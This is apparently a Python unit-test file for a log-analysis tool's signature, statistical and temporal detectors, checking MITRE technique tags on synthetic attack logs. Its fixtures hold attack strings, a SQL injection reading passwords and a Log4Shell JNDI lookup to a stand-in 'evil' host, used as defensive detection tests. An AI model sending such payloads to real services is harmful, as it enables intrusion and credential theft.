"""Direct unit tests for the pattern / statistical / temporal detectors:
synthetic logs with a KNOWN attack shape must produce the right finding type,
severity, and MITRE technique - and benign traffic must stay quiet. Complements
test_ml_detector.py (ML layer) and test_analyse.py (end-to-end). Audit D1.
"""
from datetime import datetime, timedelta

from log_api.detectors.pattern import run_pattern_detector
from log_api.detectors.statistical import run_statistical_detector
from log_api.detectors.temporal import run_temporal_detector
from log_api.models import ParsedLogEntry, Severity

_BASE = datetime(2026, 6, 1, 12, 0, 0)        # a weekday, mid business hours
_OFF_HOURS = datetime(2026, 6, 1, 2, 0, 0)    # 02:00 - outside 07:00-20:00


def _e(**kw) -> ParsedLogEntry:
    kw.setdefault("raw", kw.get("message") or "log line")
    return ParsedLogEntry(**kw)


# -- Pattern detector (signature-based, deterministic) -----------------------
def test_pattern_flags_sql_injection_as_t1190():
    entries = [_e(source_ip="1.2.3.4",
                  http_path="/p?id=1 UNION SELECT password FROM users")]
    f = next(f for f in run_pattern_detector(entries) if f.finding_type == "sql_injection")
    assert f.mitre_tags[0].technique_id == "T1190"
    assert f.source_ip == "1.2.3.4"


def test_pattern_flags_log4shell_as_critical():
    entries = [_e(source_ip="9.9.9.9", user_agent="${jndi:ldap://evil/x}")]
    f = next(f for f in run_pattern_detector(entries) if f.finding_type == "log4shell")
    assert f.severity == Severity.CRITICAL and f.severity_score >= 80
    assert f.mitre_tags[0].technique_id == "T1190"


def test_pattern_flags_scanner_useragent_as_t1595():
    entries = [_e(source_ip="5.5.5.5", user_agent="sqlmap/1.7", http_path="/")]
    f = next(f for f in run_pattern_detector(entries) if f.finding_type == "scanner_useragent")
    assert f.mitre_tags[0].technique_id == "T1595"


def test_pattern_quiet_on_benign_requests():
    entries = [_e(source_ip="10.0.0.1", http_method="GET", http_path="/index.html",
                  user_agent="Mozilla/5.0") for _ in range(5)]
    assert run_pattern_detector(entries) == []


# -- Statistical detector ----------------------------------------------------
def test_statistical_flags_request_rate_spike_as_t1110():
    # 130 requests from one IP inside a single minute (>= RATE_SPIKE_RPM_THRESHOLD=120).
    entries = [_e(source_ip="7.7.7.7", timestamp=_BASE + timedelta(seconds=i % 60),
                  http_path="/", http_status=200) for i in range(130)]
    f = next(f for f in run_statistical_detector(entries)
             if f.finding_type == "request_rate_spike")
    assert f.source_ip == "7.7.7.7"
    assert f.mitre_tags[0].technique_id == "T1110"


def test_statistical_flags_error_rate_spike_as_t1595():
    # 20 requests in one 5-min window, 60% of them 5xx (>= ERROR_RATE_THRESHOLD_PCT=40).
    entries = [_e(source_ip="8.8.8.8", timestamp=_BASE + timedelta(seconds=i),
                  http_path=f"/p{i}", http_status=(500 if i < 12 else 200))
               for i in range(20)]
    f = next(f for f in run_statistical_detector(entries)
             if f.finding_type == "error_rate_spike")
    assert f.mitre_tags[0].technique_id == "T1595"


def test_statistical_quiet_on_steady_traffic():
    entries = [_e(source_ip="10.0.0.2", timestamp=_BASE + timedelta(seconds=i * 30),
                  http_path="/", http_status=200) for i in range(5)]
    assert run_statistical_detector(entries) == []


# -- Temporal detector -------------------------------------------------------
def test_temporal_flags_off_hours_auth_as_t1078():
    entries = [_e(source_ip="3.3.3.3", process="sshd", message="accepted password",
                  timestamp=_OFF_HOURS + timedelta(minutes=i)) for i in range(3)]
    f = next(f for f in run_temporal_detector(entries)
             if f.finding_type == "off_hours_auth_activity")
    assert f.mitre_tags[0].technique_id == "T1078"


def test_temporal_flags_request_burst_as_t1498():
    # 25 requests from one IP within the burst window (10s) → DoS-shaped burst.
    entries = [_e(source_ip="4.4.4.4", timestamp=_BASE + timedelta(seconds=i % 8))
               for i in range(25)]
    f = next(f for f in run_temporal_detector(entries)
             if f.finding_type == "request_burst")
    assert f.mitre_tags[0].technique_id == "T1498"
    assert f.count >= 20
